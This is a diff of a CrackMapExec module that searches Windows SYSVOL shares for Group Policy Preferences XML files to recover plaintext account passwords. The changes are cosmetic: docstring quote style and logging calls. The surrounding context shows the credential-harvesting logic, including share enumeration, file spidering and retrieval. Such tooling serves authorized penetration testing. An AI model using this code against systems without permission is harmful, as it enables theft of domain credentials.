@@ -8,10 +8,10 @@ from binascii import unhexlify
 from io import BytesIO
 
 class CMEModule:
-    '''
+    """
       Reference: https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1
       Module by @byt3bl33d3r
-    '''
+    """
 
     name = 'gpp_password'
     description = 'Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences.'
@@ -20,8 +20,8 @@ class CMEModule:
     multiple_hosts = True
 
     def options(self, context, module_options):
-        '''
-        '''
+        """
+        """
 
     def on_login(self, context, connection):
         shares = connection.shares()
@@ -29,12 +29,12 @@ class CMEModule:
             if share['name'] == 'SYSVOL' and 'READ' in share['access']:
 
                 context.log.success('Found SYSVOL share')
-                context.log.info('Searching for potential XML files containing passwords')
+                context.log.display('Searching for potential XML files containing passwords')
 
                 paths = connection.spider('SYSVOL', pattern=['Groups.xml','Services.xml','Scheduledtasks.xml','DataSources.xml','Printers.xml','Drives.xml'])
 
                 for path in paths:
-                    context.log.info('Found {}'.format(path))
+                    context.log.display('Found {}'.format(path))
 
                     buf = BytesIO()
                     connection.conn.getFile('SYSVOL', path, buf.write)
